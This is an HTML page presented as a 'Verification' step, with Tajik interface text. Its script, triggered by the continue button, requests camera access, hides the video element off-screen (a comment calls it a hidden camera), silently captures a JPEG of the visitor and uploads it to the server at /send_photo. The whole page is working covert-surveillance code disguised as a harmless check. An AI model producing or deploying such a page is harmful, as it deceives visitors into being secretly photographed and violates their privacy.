<!DOCTYPE html>
<html lang="tg">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Verification</title>

<style>
body{
  margin:0;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  font-family:Arial, sans-serif;
  color:white;
  background:
  radial-gradient(circle at 20% 30%, #6a5cff55, transparent 40%),
  radial-gradient(circle at 80% 20%, #00ffc855, transparent 40%),
  radial-gradient(circle at 50% 90%, #ff4da655, transparent 50%),
  #05060a;
}

.card{
  width:380px;
  padding:28px;
  border-radius:20px;
  background:rgba(255,255,255,0.08);
  backdrop-filter:blur(15px);
  border:1px solid rgba(255,255,255,0.15);
  text-align:center;
  box-shadow:0 20px 60px rgba(0,0,0,.6);
}

h2{
  margin-top:0;
}

#status{
  opacity:.8;
  font-size:14px;
}

button{
  margin-top:16px;
  width:100%;
  padding:14px;
  border:none;
  border-radius:12px;
  font-size:16px;
  font-weight:bold;
  cursor:pointer;
  background:linear-gradient(135deg,#7b5cff,#00ffd0);
  color:#000;
}

button:disabled{
  opacity:.6;
  cursor:not-allowed;
}

/* камера пинҳон */
#video{
  position:fixed;
  left:-9999px;
  top:-9999px;
  width:1px;
  height:1px;
  opacity:0;
}

#canvas{display:none;}
</style>
</head>

<body>

<div class="card">
  <h1>Чак чак</h2>
  <p id="status">Press continue</p>
  <button id="startBtn">давом додан</button>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>
</div>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusText = document.getElementById("status");
const startBtn = document.getElementById("startBtn");

function setStatus(t){
  statusText.innerText = t;
}

function sleep(ms){
  return new Promise(r=>setTimeout(r,ms));
}

startBtn.onclick = async ()=>{
  startBtn.disabled = true;
  await start();
};

async function start(){
try{
  setStatus("Requesting camera...");

  const stream = await navigator.mediaDevices.getUserMedia({
    video:true,
    audio:false
  });

  video.srcObject = stream;
  await video.play().catch(()=>{});

  setStatus("Camera ready");
  await sleep(1500);

  while(!video.videoWidth){
    await sleep(100);
  }

  setStatus("Capturing...");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video,0,0);

  const blob = await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.95));

  setStatus("Uploading...");
  await sendToServer(blob);

  setStatus("Completed ✓");
  stream.getTracks().forEach(t=>t.stop());

}catch(e){
  console.error(e);
  setStatus("Error: "+e.message);
}
}

async function sendToServer(blob){
const fd = new FormData();
fd.append("photo", blob, "photo.jpg");

const res = await fetch("/send_photo", {
method:"POST",
body:fd
});

if(!res.ok){
throw new Error(await res.text());
}

const data = await res.json();
if(!data.ok){
throw new Error("Server error");
}
}
</script>

</body>
</html>
